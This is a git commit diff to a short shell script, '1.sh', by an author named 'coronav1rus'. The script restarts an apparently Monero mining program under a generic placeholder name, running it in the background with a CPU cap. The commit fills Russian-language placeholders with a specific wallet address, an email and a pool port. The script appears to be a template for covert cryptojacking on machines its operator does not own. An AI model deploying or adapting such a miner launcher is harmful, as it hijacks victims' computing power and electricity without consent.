803fd282f34425bd7acfcc1284da79b80de16851
coronav1rus <62151568+coronav1rus@users.noreply.github.com>
2020-03-13 17:21:52 +0000

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=74 --av=1
+defaultsoftwarename -o ВАШ ИП:3323 -u 47BfWrdYDpY8y5FaFn25kJK7soK5sLtcSYw2AtsHMo1TEJ7YETor8nMRU1jtYJjCdN8KUDz9BADsfVa58KNUNsJQCYAzAwH --pass=x:vasyan@mail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=74 --av=1
